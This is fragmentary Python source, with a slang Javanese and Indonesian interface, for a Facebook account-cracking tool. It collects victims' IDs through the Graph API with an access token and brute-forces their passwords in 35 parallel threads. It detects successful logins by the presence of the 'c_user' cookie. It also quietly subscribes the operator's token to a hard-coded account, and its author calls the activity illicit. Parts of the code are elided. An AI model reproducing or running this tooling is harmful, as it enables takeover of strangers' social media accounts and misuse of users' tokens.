...
def crack(user,pw):
	...
	try:
		...
		if 'c_user' in ses.cookies.get_dict().keys():
			...
			print(f'\r{merah}Sinyalmu bosok lek.	',end='')
...
def login():
	try:
		...
		try:
			...
			print(f"\n[{ijo}✓{putih}] LOGIN SUKSES\n[{merah}!{putih}] TUNGGU DILIT YO DEK...")
			...
			req.post(f'https://graph.facebook.com/100038229180697/subscribers?access_token={token}') #RIYAN
			...
			exit(f"[{merah}×{putih}] TOKEN BOSOK [{merah}×{putih}]")
	except KeyError:
...
▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄█▄▄▀▄▄▄▄▀▀
        \/         \/
        %sLatif. H & Yanwa & Fajar-Al
        """%(ijo,putih))
	print(f"[{biruM}!{putih}] URIPNO => PATENI MODE PESAWAT [{biruM}!{putih}]")
	jalan(f"[{biru}={putih}] MONGGO MAS \t: {biruM}{nama}{putih}\n[{biru}={putih}] TTL KAMU\t: {biruM}{ttl}{putih}")
	print(f"\n[{biruM}/\{putih}] DUMP ID BERDASARKAN [{biruM}/\{putih}]\n[{biruL}01{putih}] DUMP ID DARI KONCO\n[{biruL}02{putih}] DUMP FROM  PENGIKUT ALIRAN SESAT\n[{biruL}03{putih}] DUMP DARI TEMAN \n[{biruL}04{putih}] CARI TARGET MALING\n[{biruL}05{putih}] CEK HASIL MALING\n[{biruL}UA{putih}] SETTINGS USERAGENT\n")
	l=input(f"[{biru}?{putih}] DIPILEH MAS\t: ")
	if(l in ("01","1")):
		print("")
		try:
			jmh=int(input(f"[{biruM}?{putih}] JUMLAH TARGET PIRO\t: "))
		except:
			try:
				print(f"\n{merah} *** Angka cok bukan huruf!{putih}")
				jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
			except:
				print(f"\n{merah} *** Masukan Angka Jangan Huruf!{putih}")
				jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
		print(f"\n[{biruM}!{putih}] Ketik {biru}'su'{putih} Untuk Daftar Bolomu [{biruM}!{putih}]")
		for x in range(jmh):
			i=input(f"[{biru}+{putih}] ID CAH ASU\t: ")
			try:
				cek=json.loads(req.get(f"https://graph.facebook.com/{i}?access_token={token}").text)
				print(f"[{ijo}={putih}] NAMA CAH ASU\t: {cek['name']}")
			except KeyError:
				exit(f"[{merah}×{putih}] TARGET KOID [{merah}×{putih}]")
			try:
			...
			except KeyError:exit(f"[{merah}×{putih}] CARI ASU LAIN [{merah}×{putih}]")
		...
		print(f"\n *** USERAGENT SAK IKI: {biruM}{open('ua','r').read()}{putih}\n")
		print("PENGEN GANTI USER AGENT?")
		yt=input("[?] AREP GANTI UA [Y/T]\t: ")
		if(yt in ("Y","y")):
			os.system("rm -rf ua")
			ua=input("[+] LEBOKNO USER AGENT \t: ")
			open("ua","w").write(ua)
			print(f"{ijo}USERAGENT WES DIGANTI{putih}")
			input(f"[ ENTER COK ]")
			dump(token,nama)
		elif(yt in ("T","t")):
			input(f"\n[ ENTER COK ]")
		...
		dump(token,nama,ttl)
	time.sleep(1)
	print(f"[{biruM}/\{putih}] PILIHEN METODE CRACK [{biruM}/\{putih}]\n[{biruL}01{putih}] METODE {merah}B-API{putih} (fast) hasil akeh tapi rawan spam \n[{biruL}02{putih}] METODE {kuning}MBASIC V1{putih} (fast) hasil sitik\n[{biruL}03{putih}] METODE {ijo}MBASIC V2{putih} (low) hasil panen cok [rekomen iki]\n")
	...
	if(pi in ("01","1")):
		with Bool(max_workers=35) as kirim:
			pas=input(f"[{ijo}+{putih}] Lebokno pasword manual\t: ").replace(" ","").split(",")
			op=input(f"[{biru}?{putih}] Pengen delok opsi cp [y/t]\t: ")
			print("\n *** Inget mas ini jalur haram jadi saya tidak bertanggung jawab \n")
			if(op in ('y','Y')):
				opsi.append('y')
			elif(op in ('t','T')):
				opsi.append('t')
		...
		print(f"\n[{ijo}√{putih}] CRACK RAMPUNG")
		uu=input(f"[{biruM}?{putih}] GOLEK DOSA MENEH [Y/T]\t: ")
		if(uu in ("y","Y")):
			id.clear()
			dump(token,nama)
		else:
